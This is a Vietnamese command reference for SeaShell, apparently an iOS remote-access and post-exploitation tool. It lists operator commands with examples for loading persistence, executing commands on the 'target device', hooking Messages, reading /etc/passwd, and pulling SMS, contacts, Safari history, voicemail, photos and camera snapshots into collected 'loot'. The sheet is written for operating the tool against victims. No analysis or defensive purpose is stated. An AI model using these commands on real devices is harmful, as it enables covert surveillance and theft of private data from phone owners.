# Danh sách Lệnh SeaShell cho iOS

## Core (Lõi/Cơ bản)

*   **`exit`** - Kết thúc phiên làm việc hiện tại.
    *   *Ví dụ:* `exit`
*   **`help`** - Hiển thị danh sách các lệnh có sẵn và mô tả ngắn gọn.
    *   *Ví dụ:* `help`
*   **`load`** - Tải một plugin cụ thể.
    *   *Ví dụ:* `load persistence`
*   **`plugins`** - Liệt kê tất cả các plugin hiện có sẵn để tải.
    *   *Ví dụ:* `plugins`
*   **`quit`** - Dừng tương tác với phiên hiện tại (tương tự exit).
    *   *Ví dụ:* `quit`
*   **`prompt`** - Thay đổi dấu nhắc lệnh hiển thị trong terminal.
    *   *Ví dụ:* `prompt seashell>`
*   **`exec`** - Thực thi một lệnh hoặc đường dẫn trực tiếp trên thiết bị mục tiêu.
    *   *Ví dụ:* `exec /bin/ls /tmp`
*   **`unload`** - Gỡ bỏ một plugin đã được tải.
    *   *Ví dụ:* `unload persistence`

---

## UI (Giao diện người dùng)

*   **`apps`** - Liệt kê tất cả các ứng dụng đã cài đặt trên thiết bị.
    *   *Ví dụ:* `apps`
*   **`clipboard`** - Đọc nội dung từ bộ nhớ đệm (clipboard) hoặc ghi nội dung vào đó.
    *   *Ví dụ (Đọc):* `clipboard read`
    *   *Ví dụ (Ghi):* `clipboard write "Văn bản cần ghi"`
*   **`open`** - Mở một URL trong trình duyệt mặc định hoặc khởi chạy một ứng dụng bằng Bundle ID.
    *   *Ví dụ (URL):* `open https://google.com`
    *   *Ví dụ (App):* `open com.apple.mobilesafari`
*   **`player`** - Điều khiển trình phát media (chơi, dừng, tạm dừng, điều chỉnh âm lượng).
    *   *Ví dụ:* `player play`, `player pause`, `player volume 50`
*   **`say`** - Phát một đoạn văn bản thành giọng nói trên thiết bị.
    *   *Ví dụ:* `say "Thiết bị đã bị xâm nhập"`
*   **`volume`** - Đặt mức âm lượng của thiết bị (thường từ 0 đến 100).
    *   *Ví dụ:* `volume 80`

---

## Local (Cục bộ - Lệnh chạy trên máy tấn công)

*   **`lpwd`** - Hiển thị thư mục làm việc hiện tại trên máy cục bộ (máy của bạn).
    *   *Ví dụ:* `lpwd`
*   **`lcd`** - Thay đổi thư mục làm việc hiện tại trên máy cục bộ.
    *   *Ví dụ:* `lcd /home/user/loot`

---

## Manage (Quản lý)

*   **`kill`** - Dừng một tiến trình đang chạy trên thiết bị mục tiêu bằng Process ID (PID).
    *   *Ví dụ:* `kill 1234`
*   **`killall`** - Dừng tất cả các tiến trình có tên cụ thể trên thiết bị mục tiêu.
    *   *Ví dụ:* `killall SpringBoard`
*   **`tunnels`** - Quản lý các kết nối mạng đường hầm (liệt kê, thêm, xóa).
    *   *Ví dụ (Liệt kê):* `tunnels list`
    *   *Ví dụ (Thêm):* `tunnels add tcp 8080 127.0.0.1 80`
*   **`loot`** - Quản lý các dữ liệu (loot) đã thu thập được từ thiết bị mục tiêu.
    *   *Ví dụ:* `loot list`

---

## Evasion (Né tránh/Bảo mật)

*   **`hook`** - Can thiệp (hook) vào một ứng dụng khác để theo dõi hoặc sửa đổi hành vi.
    *   *Ví dụ:* `hook MobileSMS`
*   **`unhook`** - Gỡ bỏ can thiệp (hook) khỏi một ứng dụng.
    *   *Ví dụ:* `unhook MobileSMS`
*   **`secure`** - Bật hoặc tắt mã hóa TLS cho kết nối mạng của SeaShell.
    *   *Ví dụ (Bật):* `secure on`
    *   *Ví dụ (Tắt):* `secure off`

---

## Filesystem (Hệ thống tệp - Lệnh chạy trên thiết bị mục tiêu)

*   **`cat`** - Đọc và hiển thị nội dung của một tệp tin.
    *   *Ví dụ:* `cat /etc/passwd`
*   **`cd`** - Thay đổi thư mục làm việc hiện tại trên thiết bị mục tiêu.
    *   *Ví dụ:* `cd /var/mobile/Media`
*   **`chmod`** - Thay đổi quyền truy cập (permissions) của tệp hoặc thư mục.
    *   *Ví dụ:* `chmod 755 /var/mobile/my_script.sh`
*   **`cp`** - Sao chép tệp hoặc thư mục.
    *   *Ví dụ:* `cp /var/mobile/file1.txt /tmp/file1_copy.txt`
*   **`download`** - Tải tệp hoặc thư mục từ thiết bị mục tiêu về máy cục bộ.
    *   *Ví dụ:* `download /var/mobile/Media/DCIM/100APPLE/IMG_0001.JPG /local/save/path/`
*   **`list`** (hoặc `ls`) - Liệt kê nội dung của một thư mục.
    *   *Ví dụ:* `list /var/mobile/`
*   **`mkdir`** - Tạo một thư mục mới.
    *   *Ví dụ:* `mkdir /var/mobile/new_folder`
*   **`mv`** - Di chuyển hoặc đổi tên tệp/thư mục.
    *   *Ví dụ:* `mv /tmp/file1_copy.txt /var/mobile/new_location.txt`
*   **`pwd`** - Hiển thị thư mục làm việc hiện tại trên thiết bị mục tiêu.
    *   *Ví dụ:* `pwd`
*   **`rm`** - Xóa một tệp tin.
    *   *Ví dụ:* `rm /tmp/temp_file.txt`
*   **`rmdir`** - Xóa một thư mục rỗng.
    *   *Ví dụ:* `rmdir /var/mobile/empty_folder`
*   **`edit`** - Chỉnh sửa nội dung của một tệp tin từ xa (thường mở trình soạn thảo cục bộ).
    *   *Ví dụ:* `edit /etc/hosts`
*   **`upload`** - Tải tệp hoặc thư mục từ máy cục bộ lên thiết bị mục tiêu.
    *   *Ví dụ:* `upload /local/path/to/tool /var/mobile/tool`

---

## Gather (Thu thập thông tin)

*   **`cam`** - Quản lý camera (liệt kê, chụp ảnh, quay video).
    *   *Ví dụ (Liệt kê):* `cam list`
    *   *Ví dụ (Chụp ảnh trước):* `cam snap front`
    *   *Ví dụ (Quay 10s sau):* `cam record 10 rear`
*   **`sbinfo`** - Lấy thông tin về SpringBoard (giao diện chính của iOS).
    *   *Ví dụ:* `sbinfo`
*   **`contacts`** - Liệt kê danh bạ được lưu trên thiết bị.
    *   *Ví dụ:* `contacts`
*   **`device`** - Hiển thị thông tin chi tiết về thiết bị (HĐH, UDID, model...).
    *   *Ví dụ:* `device`
*   **`localtime`** - Hiển thị ngày giờ hiện tại trên thiết bị mục tiêu.
    *   *Ví dụ:* `localtime`
*   **`photos`** - Tải về toàn bộ nội dung thư mục DCIM (ảnh và video).
    *   *Ví dụ:* `photos /local/DCIM_backup/`
*   **`pid`** - Lấy Process ID (PID) của tiến trình SeaShell đang chạy.
    *   *Ví dụ:* `pid`
*   **`ps`** - Liệt kê tất cả các tiến trình đang chạy trên thiết bị.
    *   *Ví dụ:* `ps`
*   **`safari_history`** - Liệt kê lịch sử duyệt web của MobileSafari.
    *   *Ví dụ:* `safari_history`
*   **`safari_bookmarks`** - Liệt kê các dấu trang (bookmarks) đã lưu trong MobileSafari.
    *   *Ví dụ:* `safari_bookmarks`
*   **`sms`** - Liệt kê các tin nhắn SMS và iMessage.
    *   *Ví dụ:* `sms`
*   **`sysinfo`** - Lấy thông tin hệ thống cơ bản (CPU, bộ nhớ, dung lượng...).
    *   *Ví dụ:* `sysinfo`
*   **`voicemail`** - Liệt kê các tệp tin thư thoại.
    *   *Ví dụ:* `voicemail`
*   **`whoami`** - Hiển thị người dùng hiện tại mà tiến trình SeaShell đang chạy dưới quyền.
    *   *Ví dụ:* `whoami`
